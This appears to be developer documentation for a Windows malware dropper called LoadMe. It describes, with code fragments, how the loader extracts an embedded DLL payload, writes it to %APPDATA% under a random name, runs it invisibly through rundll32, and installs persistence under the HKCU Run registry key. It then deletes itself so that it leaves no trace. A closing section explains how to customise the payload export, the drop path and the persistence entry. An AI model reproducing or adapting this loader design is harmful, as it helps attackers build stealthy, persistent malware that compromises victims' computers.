# loadder.cpp

## Overview
`loadder.cpp` is the entry point of the **LoadMe** application. It implements the full extraction-and-execution flow: locating the embedded payload inside its own PE structure, writing it to disk, launching it via `rundll32.exe`, registering it for automatic startup, and finally removing itself from disk.

---

## Functions

### `WinMain`
```cpp
INT WINAPI WinMain(HMODULE current, HMODULE previous, LPSTR cmd, INT show)
```

The GUI-less Windows entry point. Executes the complete payload deployment sequence.

**Step-by-step logic:**

1. **Base address resolution** — calls `Tools::GetImageBase()` to find where LoadMe itself is loaded in memory. Exits silently if it returns `NULL`.

2. **Payload extraction** — calls `Tools::ExtractDllFile(moduleBase, &moduleSize)` to get a pointer to the embedded DLL bytes and their size. The returned buffer is heap-allocated via `LocalAlloc` inside `ExtractDllFile` and must be freed with `LocalFree` after use.

3. **Drop path construction** — expands `%APPDATA%` via `ExpandEnvironmentStringsW`, then builds the destination path:
   ```
   %APPDATA%\<GetTickCount()>.dll
   ```
   The tick-based filename produces a different value on each execution.

4. **Payload write** — creates the file at that path with `CreateFileW` (`CREATE_ALWAYS`) and writes the extracted bytes with `WriteFile`.

5. **Command line construction** — expands `%WINDIR%` and builds the launch command:
   ```
   "<WINDIR>\System32\rundll32.exe" "<APPDATA>\<ticks>.dll",fristEntry
   ```
   The export name is controlled by the constant `runningFunctionName`:
   ```cpp
   const LPCWSTR runningFunctionName = L"fristEntry";
   ```
   > **Note:** `fristEntry` is a typo of `firstEntry`. If you want to rename it, change this constant **and** update the exported function name in your payload DLL accordingly, then recompile both.

6. **Payload launch** — spawns `rundll32.exe` with `CREATE_NO_WINDOW` so the process runs invisibly in the background.

7. **Persistence** — opens `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run` with `KEY_WRITE` and writes a `REG_SZ` value whose **data** is the fully resolved `commandLine` string. This causes the payload to execute automatically on every user login.

   > **Known issue — registry value name.** The value name is currently the literal string `L"%s\\%lu"` instead of a meaningful identifier. The data written is correct (the full command line), so the persistence mechanism works, but the entry will appear in the registry under the raw format string as its name. To fix, replace `valueName` with a proper application name string and recompile.

8. **Cleanup** — calls `LocalFree(dllMemory)` to release the extracted payload buffer, then calls `DeleteLoadFile()` to schedule self-deletion of the loader.

---

### `DeleteLoadFile`
```cpp
int DeleteLoadFile()
```

Schedules self-deletion of the `LoadMe.exe` binary after execution.

**Step-by-step logic:**

1. Expands `%WINDIR%` to locate `cmd.exe`.
2. Builds the command string:
   ```
   <WINDIR>\System32\cmd.exe /c del "<path to LoadMe.exe>"
   ```
   The loader's own path is retrieved via `GetModuleFileNameW(0, ...)`.
3. Spawns `cmd.exe` with `CREATE_NO_WINDOW`, leaving no visible trace.
4. Closes both process handles immediately — the loader does not wait for deletion to complete.

Returns `0` on success, `-1` on any failure (failed environment expansion, failed `GetModuleFileNameW`, or failed `CreateProcessW`).

> **Why `cmd.exe /c del`?** A process cannot delete its own executable while it is running. Delegating the deletion to a child `cmd.exe` process solves this — by the time `cmd.exe` runs the `del` command, the loader has already exited and released its file lock.

---

## Modifying

**Change the export name called on the DLL:**
```cpp
const LPCWSTR runningFunctionName = L"YourExportName";
```
Ensure the payload DLL exports a function with exactly this name (case-sensitive).

**Change the drop directory:**
Replace the `%APPDATA%` expansion with any other environment variable or hardcoded path. Example for `%TEMP%`:
```cpp
ExpandEnvironmentStringsW(L"%TEMP%", envPath, MAX_PATH);
```

**Fix the registry value name:**
Replace the `valueName` literal with a descriptive string:
```cpp
LPCWSTR valueName = L"MyAppName";
```

**Disable self-deletion:**
Comment out or remove the `DeleteLoadFile()` call at the end of `WinMain` if you need the loader to persist on disk for debugging purposes.